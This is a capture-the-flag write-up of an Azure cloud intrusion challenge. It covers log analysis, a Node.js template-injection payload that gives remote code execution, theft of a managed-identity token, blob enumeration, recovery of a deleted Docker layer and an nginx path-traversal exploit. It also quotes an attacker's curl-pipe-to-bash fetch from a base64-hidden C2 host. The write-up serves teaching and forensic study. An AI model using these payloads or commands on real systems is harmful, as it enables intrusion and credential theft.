# R U Hunter v2

## Writeups from the teams

- [Team ACB](https://github.com/danh-software/DF25_Online_Round/blob/main/Hunter.md)
- [Team UPAY](https://hackmd.io/@x0u8VKqLRBCY9U5dgHA7xg/SyT2OHb2ee)

## Summary Paths

```ln:false wrap
Service Principal Login
    ↓
Log Analytics Reader Access → Export 7 Days Logs
    ↓
API Analysis → SSTI in /api/payment message parameter
    ↓
RCE → Environment Enumeration → MSI Endpoint Discovery
    ↓
MSI Token Theft for Azure Storage
    ↓
Blob Storage Enumeration (with versions) → Flag Part 1 + SP Credentials
    ↓
ACR Login → Pull hello-world Image
    ↓
Docker Image Layer Analysis → Flag Part 2 (deleted file recovery)
    ↓
Entrypoint Analysis → Base64 C2 Server Discovery
    ↓
Nginx Path Traversal (aa../) → Flag Part 3
```

## Azure Log Analytics Access

Authenticated with service principal and enumerated permissions

```ln:false wrap
# Login
az login --service-principal
	-u "8ea2379a-b4ef-41e7-bc64-cbf17c96a5d6"
	-p "[secret]"
	--tenant "f86939d1-b472-486f-83e9-b0a4b3fa6fec"

# Get roles
az role assignment list
	--assignee $(az account show --query user.name -o tsv)
	--all
```

Role: `Log Analytics Reader` on `qrweb-logs` workspace.

Enumerated all tables in the workspace:

```ln:false wrap
az monitor log-analytics query --workspace $CID --analytics-query '
        let tableCounts = search * | summarize Count = count() by $table;
        let sampleData = search *
        | summarize SampleRecord = take_any(*) by $table
        | extend SampleJson = tostring(SampleRecord);
        tableCounts
        | join kind=leftouter sampleData on $table
        | project TableName = $table, RecordCount = Count, SampleRecord = SampleJson
        | order by TableName asc'
```

Discovered the log workspace collects logs from multiple services via table names:

- Azure APIM (AppTraces, AppSystemEvents, AppRequests, AppExceptions, ...)
- Azure Container App (though no direct tables visible, typically deployed alongside APIM)
- Blob Storage (StorageBlobLogs)
- Azure Container Registry (ContainerRegistryLoginEvents, ContainerRegistryRepositoryEvents)

Querying logs from the last 7 days revealed interesting activity

```ln:false wrap
az monitor log-analytics query --workspace $CID --analytics-query "
        ContainerRegistryRepositoryEvents
        | where TimeGenerated > ago(7d)
        | project TimeGenerated, Identity, OperationName, Repository, Tag"
```

```ln:false wrap
 az monitor log-analytics query --workspace $CID --analytics-query "
        StorageBlobLogs
        | where TimeGenerated > ago(7d)
        | project TimeGenerated, OperationName, Uri, StatusText, CallerIpAddress, AuthenticationType"
```

```ln:false wrap
az monitor log-analytics query --workspace $CID --analytics-query "
        AppTraces
        | where TimeGenerated > ago(7d)
        | project TimeGenerated, Message, AppRoleName"
```

Key findings:

- Blob Storage: 2 containers - `qrcode` (public) and `internal` containing sensitive files like credentials.json
- Container App: 2 suspicious endpoints with heavy attacker activity - `/api/payment` and `/api/scan`
- Azure Container Registry: Multiple images with push/pull activity from users "b9b1118d-b821-4be7-8605-aac82dbdcb7f" and "4834ae62-2b8d-431a-bce7-55593eff32d7"

## Part 1 - Container App and Blob Storage

APIs discovered: `/api/payment` (create QR) and `/api/scan` (scan QR from URL).

Exploited SSTI in `message` parameter:

```json ln:false
{
  "amount": 1313,
  "recipient": "1d",
  "message": "<%= (global.constructor.constructor('return process')()).mainModule.require('child_process').execSync('command').toString() %>"
}
```

Environment enumeration revealed:

- MSI endpoint: `http://localhost:12356/msi/token` via env **AZURE_CLIENT_ID**
- Client ID: `5557107a-b00b-4a7c-84df-3670932d1b39` via env **IDENTITY_HEADER**

Since the Container App has Blob Storage access, requested an access token for `https://storage.azure.com/`

```bash ln:false
wget --header="X-IDENTITY-HEADER: $IDENTITY_HEADER" \
        "$IDENTITY_ENDPOINT?resource=https://storage.azure.com&api-version=2019-08-01&client_id=$AZURE_CLIENT_ID" \
        -O- 2>/dev/null
```

Enumerated blob storage with versions:

```bash ln:false
curl -H "Authorization: Bearer $TOKEN" -H "x-ms-version: 2021-08-06" \
  "https://qrwebsax3zov6py.blob.core.windows.net/internal?restype=container&comp=list&include=versions"
```

or use this script

```python ln:false wrap folded title:blob.py
#!/usr/bin/env python3
import xml.etree.ElementTree as ET

import requests

ACCESS_TOKEN = "..."
STORAGE_ACCOUNT = "qrwebsax3zov6py"
CONTAINER_NAME = "internal"

url = f"https://{STORAGE_ACCOUNT}.blob.core.windows.net/{CONTAINER_NAME}"
params = {"restype": "container", "comp": "list", "include": "versions,metadata"}
headers = {"Authorization": f"Bearer {ACCESS_TOKEN}", "x-ms-version": "2021-08-06"}

response = requests.get(url, params=params, headers=headers)

if response.status_code == 200:
    root = ET.fromstring(response.text)
    ns = {"": "http://schemas.microsoft.com/ado/2007/08/dataservices"}

    for blob in root.findall(".//Blob"):
        name = blob.find("Name").text
        version_id = blob.find("VersionId")
        is_current = blob.find("IsCurrentVersion")

        print(f"Blob: {name}")
        if version_id is not None:
            print(f"  Version: {version_id.text}")
        if is_current is not None:
            print(f"  Current: {is_current.text}")
        print()
else:
    print(f"Error: {response.status_code}")
    print(response.text)
```

**Flag Part 1:** `DF25{d4e9e6814f` found in blob storage.

Discovered service principal credentials for ACR access (from initial analysis, "4834ae62-2b8d-431a-bce7-55593eff32d7" was identified as the user pushing/pulling images to ACR)

```json ln:false
{
  "appId": "4834ae62-2b8d-431a-bce7-55593eff32d7",
  "displayName": "tung-acr",
  "password": "[hidden]",
  "tenant": "f86939d1-b472-486f-83e9-b0a4b3fa6fec"
}
```

## Part 2 - Azure Container Registry and Docker Image

Multiple images with various tags found. Used script to enumerate repositories

```bash ln:false wrap folded title:image.sh
ACR_NAME=acrqrwebllptbcbf
for REPO in $(az acr repository list --name $ACR_NAME --output tsv); do
    echo "Repository: $REPO"
    echo "Tags:"
    az acr repository show-tags \
        --name $ACR_NAME \
        --repository $REPO \
        --output table
    echo ""
    echo "---"
    echo ""
done
```

Analysis identified suspicious malicious image pushed by attacker: `hello-world:latest`

```bash ln:false wrap
docker login acrqrwebllptbcbf.azurecr.io -u 4834ae62-2b8d-431a-bce7-55593eff32d7
docker pull acrqrwebllptbcbf.azurecr.io/hello-world:latest
```

Dockerfile history showed deleted flag:

```dockerfile ln:false wrap
...
COPY flag .
RUN /bin/sh -c rm -rf ./flag && echo "Try to read me"
...
```

Extracted layers from image:

```bash ln:false wrap
docker save acrqrwebllptbcbf.azurecr.io/hello-world:latest -o image.tar
tar -xf image.tar
```

Found flag in layer before deletion.

**Flag Part 2:** `6ea2c94c3e`

## Part 3 - Exploiting Attacker's Misconfiguration

Analyzed entrypoint script:

```ln:false wrap
docker run -it --entrypoint /bin/sh acrqrwebllptbcbf.azurecr.io/hello-world
cat /app/entrypoint.sh
```

Found base64-encoded C2 server: `188.166.230.157`

```ln:false wrap
SERVER=$(echo MTg4LjE2Ni4yMzAuMTU3Cg== | base64 -d)
check_updates() { curl -s http://$SERVER/update.sh | bash > /dev/null 2>&1 }
```

Enumerated nginx server. Discovered attacker exposed payload folders at `/aa/` and `/public/` with basic auth protection.

<img width="1193" height="308" alt="image" src="https://github.com/user-attachments/assets/6d72c6e2-ddaf-4ca1-8893-64962d5d694b" />

Found `default.save` (nginx config backup file)

Exploited nginx path traversal misconfiguration:

```ln:false wrap
http://188.166.230.157/aa../uploads/flag
```

**Flag Part 3:** `f032f1fb5859`
